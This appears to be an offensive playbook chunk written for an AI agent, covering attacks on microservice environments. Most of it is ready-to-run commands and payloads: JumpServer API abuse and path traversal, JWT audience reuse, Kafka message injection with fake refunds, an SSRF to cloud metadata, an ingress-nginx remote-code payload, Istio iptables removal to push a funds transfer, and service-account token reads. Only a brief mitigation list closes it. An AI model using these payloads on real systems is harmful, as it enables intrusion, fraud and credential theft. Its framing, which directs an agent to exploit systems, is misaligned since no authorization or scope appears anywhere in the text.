# Microservice Auth Bypass & Event Bus Poisoning — Agent Chunk 83a
> Source: JumpServer CVEs, Kafka CVEs, Kubernetes ingress CVEs (2024-2026), Istio/Envoy advisories, service mesh research
> Purpose: Teaches the agent to exploit authentication gaps in service-to-service communication, poison event buses, and attack Kubernetes ingress controllers
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing microservice architectures. Focus areas: service-to-service authentication bypass (most common), event bus message injection, Kubernetes ingress misconfigurations, and sidecar proxy vulnerabilities. Internal APIs between microservices often lack authentication because developers assume network isolation provides sufficient security.

---

## 1. Service-to-Service Authentication Bypass

### JumpServer CVEs — Bastion Host Auth Bypass
```bash
# JumpServer is a bastion host managing SSH/RDP access to internal services
# Multiple CVEs demonstrate internal API auth bypass

# CVE-2023-42820: Session replay without authentication
curl http://jumpserver.internal:8080/api/v1/terminal/sessions/<session_id>/replay/

# CVE-2023-42819: Path traversal on internal file API
curl http://jumpserver.internal:8080/api/v1/terminal/sessions/../../../../etc/passwd

# CVE-2024-29201: Ansible playbook RCE via internal API
curl -X POST http://jumpserver.internal:8080/api/v1/ops/playbook/run/ \
  -H "Content-Type: application/json" \
  -d '{"playbook":"malicious_playbook_id"}'

# Pattern: Internal APIs trusted requests from within the cluster network
# No JWT/mTLS verification on service-to-service calls
```

### JWT Audience Confusion
```python
# Microservice A issues JWT with audience="service-a"
# Microservice B accepts any valid JWT without checking audience

# Token issued for Service A:
{
  "sub": "user123",
  "aud": "service-a",
  "role": "viewer",
  "exp": 1700000000
}

# Same token used against Service B (which has different role mappings):
curl -H "Authorization: Bearer <service_a_token>" \
  https://service-b.internal/api/admin/users
# Service B validates signature but ignores "aud" claim
# user123 gets admin access on Service B because role mapping differs

# Test: Use tokens from one service against others in the mesh
for svc in service-a service-b service-c service-d; do
  echo "Testing $svc:"
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer <token_from_other_service>" \
    "https://$svc.internal/api/admin/health"
done
```

### API Gateway Bypass — Direct Service Access
```bash
# Architecture: Client -> API Gateway (auth) -> Internal Services
# Vulnerability: Internal services accessible without going through gateway

# Discover internal services via DNS
dig +short _http._tcp.service-a.namespace.svc.cluster.local SRV

# Access internal service directly, bypassing gateway auth
curl http://service-a.namespace.svc.cluster.local:8080/api/internal/users

# Port scanning for exposed internal services
nmap -sT -p 8080,8443,3000,5000,9090 10.0.0.0/16

# Check if service accepts requests without gateway headers
curl -v http://internal-service:8080/api/data
# If 200 OK without auth headers: gateway bypass confirmed
```

---

## 2. Event Bus Poisoning

### Apache Kafka Vulnerabilities

**CVE-2018-17196: Kafka Authentication Bypass**
```bash
# Kafka broker accepted connections from unauthenticated clients
# when SASL was configured but not enforced on all listeners

# Connect to unauthenticated listener
kafkacat -b kafka-broker:9092 -L
# List all topics without credentials

# Produce malicious message to topic
echo '{"user_id":"admin","action":"promote","role":"superadmin"}' | \
  kafkacat -b kafka-broker:9092 -t user-events -P
```

**CVE-2024-27309: Kafka ACL Bypass During Migration**
```bash
# During migration from ZooKeeper to KRaft mode, ACLs were not enforced
# Window of vulnerability: from start of migration until completion

# During migration window, any client can:
# 1. Read from protected topics
kafkacat -b kafka-broker:9093 -t payment-events -C -o beginning

# 2. Write to protected topics
echo '{"type":"refund","amount":99999,"target":"attacker_account"}' | \
  kafkacat -b kafka-broker:9093 -t payment-events -P

# 3. Create/delete topics
kafka-topics.sh --create --topic exfiltration \
  --bootstrap-server kafka-broker:9093
```

**CVE-2024-36543: Kafka Connect SSRF**
```bash
# Kafka Connect REST API allows creating connectors that reach internal services
curl -X POST http://kafka-connect:8083/connectors \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ssrf-connector",
    "config": {
      "connector.class": "io.confluent.connect.http.HttpSinkConnector",
      "http.api.url": "http://169.254.169.254/latest/meta-data/",
      "topics": "test-topic"
    }
  }'
```

### Event Poisoning Attack Patterns
```json
// Pattern 1: Privilege escalation via user-event topic
{"event": "user.role.changed", "user_id": "attacker", "new_role": "admin"}

// Pattern 2: Order manipulation via order-event topic
{"event": "order.refund", "order_id": "12345", "amount": 99999.99}

// Pattern 3: Session hijack via session-event topic
{"event": "session.created", "user_id": "victim", "session_token": "attacker_token"}

// Pattern 4: Data poisoning via ML pipeline topic
{"event": "training.data", "label": "not_fraud", "features": {"amount": 99999}}
```

---

## 3. Kubernetes Ingress Attacks

### CVE-2025-1974: ingress-nginx (CVSS 9.8 — "IngressNightmare")
```bash
# Unauthenticated RCE via ingress-nginx admission controller
# The admission webhook was accessible without authentication from within the pod network

# Step 1: Send crafted AdmissionReview to the webhook
curl -X POST https://ingress-nginx-controller-admission:443/networking/v1/ingresses \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "admission.k8s.io/v1",
    "kind": "AdmissionReview",
    "request": {
      "object": {
        "metadata": {
          "annotations": {
            "nginx.ingress.kubernetes.io/configuration-snippet": "more_set_headers \"X-Pwned: true\";\n}}\n\nserver {\nlisten 8080;\nlocation / {\ncontent_by_lua_block {\nos.execute(\"id > /tmp/pwned\")\n}\n}\n"
          }
        },
        "spec": {
          "rules": [{"host": "evil.com"}]
        }
      }
    }
  }'

# Impact: Full cluster compromise from any pod in the network
# Affected: ~40% of Kubernetes clusters using ingress-nginx
```

### CVE-2025-24030: Envoy Gateway Authentication Bypass
```bash
# Envoy Gateway SecurityPolicy could be bypassed via specific path matching

# SecurityPolicy requires JWT auth for /api/*
# But Envoy path matching had inconsistency:

# Protected (matches /api/*):
curl https://target.com/api/admin/users
# Returns 401 Unauthorized

# Bypass (does not match SecurityPolicy):
curl https://target.com/API/admin/users       # Case variation
curl https://target.com/api/admin/users/       # Trailing slash
curl https://target.com//api/admin/users       # Double slash
curl https://target.com/api/admin/users%2f     # Encoded slash

# Envoy forwards all to backend, which normalizes the path
```

---

## 4. Container Sidecar Injection

### CVE-2026-23766: Istio iptables Injection
```bash
# Istio uses init containers to inject iptables rules that redirect
# traffic through the Envoy sidecar proxy

# Vulnerability: A compromised pod could modify iptables rules
# to bypass the sidecar, sending traffic directly to other services
# without mTLS or policy enforcement

# Attack from compromised pod:
# Step 1: Check current iptables rules
iptables -t nat -L -n

# Step 2: Remove Istio redirect rules
iptables -t nat -D ISTIO_OUTPUT -j RETURN

# Step 3: Direct traffic bypasses Envoy (no mTLS, no AuthorizationPolicy)
curl http://payment-service.namespace:8080/api/transfer \
  -d '{"from":"victim","to":"attacker","amount":10000}'
# Request goes directly to payment-service, bypassing all Istio policies
```

---

## 5. Service Discovery Exploitation

```bash
# Kubernetes DNS-based service discovery
# Any pod can discover all services in the cluster

# List all services via DNS
dig +short srv *.*.svc.cluster.local

# Query specific namespaces
dig +short *.production.svc.cluster.local
dig +short *.staging.svc.cluster.local

# Kubernetes API (if accessible)
curl -s https://kubernetes.default.svc/api/v1/services \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Environment variable leakage (every service creates env vars)
env | grep _SERVICE_HOST
# PAYMENT_SERVICE_SERVICE_HOST=10.96.0.45
# DATABASE_SERVICE_SERVICE_HOST=10.96.0.12
# ADMIN_SERVICE_SERVICE_HOST=10.96.0.88
```

---

## 6. Mitigation Checklist
- Enforce mTLS between all services (Istio/Linkerd strict mode)
- Validate JWT audience claim in every service, not just at the gateway
- Apply NetworkPolicies to restrict pod-to-pod communication
- Authenticate Kafka producers and consumers with SASL; enforce ACLs
- Restrict admission webhook access with NetworkPolicy (ingress-nginx)
- Use Kubernetes RBAC to limit service account permissions
- Enable audit logging for all internal service-to-service API calls
- Validate event schema and origin in event bus consumers
- Run init containers with minimal capabilities; prevent iptables modification
